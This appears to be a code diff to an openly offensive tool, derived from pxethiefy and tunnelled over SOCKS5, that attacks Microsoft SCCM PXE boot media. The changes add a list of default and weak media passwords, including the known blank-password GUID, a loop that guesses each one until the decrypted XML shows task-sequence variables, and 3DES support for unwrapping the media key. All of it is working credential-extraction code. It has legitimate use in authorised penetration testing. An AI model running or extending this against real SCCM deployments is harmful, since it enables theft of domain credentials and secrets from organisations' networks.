@@ -10,6 +10,17 @@ from Crypto.Cipher import AES, DES3
 ## Most of the code here is taken from pxethiefy.py (we're just wrapping in SOCKS5), with thanks to the author!
 ## https://github.com/csandker/pxethiefy/blob/main/pxethiefy.py
 
+# Blank/default PXE media passwords worth trying before falling back to offline
+# hash cracking. Ported from evildaemond/pxethiefup's test_default_weak_passwords_on_media.
+WEAK_PASSWORDS = [
+    "{BAC6E688-DE21-4ABE-B7FB-C9F54E6DB664}",
+    "1234", "123456", "12345678", "123456789",
+    "password", "password1", "password123",
+    "admin", "administrator", "root", "letmein",
+    "qwerty", "abc123", "welcome", "Welcome1",
+    "P@ssw0rd", "P@ssword", "P@ssw0rd1", "P@ssword1",
+]
+
 class SCCM:
     def __init__(self, target, port, socks_client):
         self.target = target
@@ -97,7 +108,7 @@ class SCCM:
         encrypted_bytes = encrypted_key[1:1+length] # pull out bytes that relate to the encrypted bytes in the DHCP response
 
         # Detect inner encryption algorithm from ALG_ID at offset 12 (little-endian u32)
-        # CALG_AES_128 = 0x660e, CALG_AES_256 = 0x6610
+        # CALG_3DES = 0x6603, CALG_AES_128 = 0x660e, CALG_AES_256 = 0x6610
         inner_alg_id = struct.unpack_from("<I", encrypted_bytes, 12)[0]
 
         encrypted_bytes = encrypted_bytes[20:-12] # isolate encrypted data bytes
@@ -108,6 +119,10 @@ class SCCM:
             # AES-256 inner encryption — use 32-byte key
             aes = AES.new(key[:32], AES.MODE_CBC, b"\x00"*16)
             var_file_key = aes.decrypt(encrypted_bytes[:16])[:10]
+        elif inner_alg_id == 0x6603:
+            # CALG_3DES inner encryption — legacy sites. Ported from blurbdust/PXEThief;
+            # unverified against a live 3DES-wrapped cryptokey capture.
+            var_file_key = self._3des_decrypt(encrypted_bytes[:24], key[:24])[:10]
         else:
             # AES-128 inner encryption (default/original behavior)
             var_file_key = self.aes128_decrypt_raw(encrypted_bytes[:16],key[:16])[:10]
@@ -192,6 +207,21 @@ class SCCM:
         # Strip trailing nulls and non-printable chars
         decrypted = decrypted[:decrypted.rfind('\x00')] if '\x00' in decrypted else decrypted
         return "".join(c for c in decrypted if c.isprintable())
+
+    def try_weak_passwords(self, filedata):
+        """Try the blank/default PXE media password plus a short list of common
+        weak passwords against a media file before falling back to offline hash
+        cracking. Ported from evildaemond/pxethiefup's test_default_weak_passwords_on_media.
+        Returns (password, decrypted_xml) on success, else (None, None).
+        """
+        for password in WEAK_PASSWORDS:
+            try:
+                decrypted = self.decrypt_media_file(filedata, password.encode("utf-16-le"))
+            except Exception:
+                continue
+            if "_SMSTSMediaPFX" in decrypted or "<var " in decrypted:
+                return password, decrypted
+        return None, None
 
     def _3des_decrypt(self, data, key):
         des3 = DES3.new(key, DES3.MODE_CBC, b"\x00" * 8)
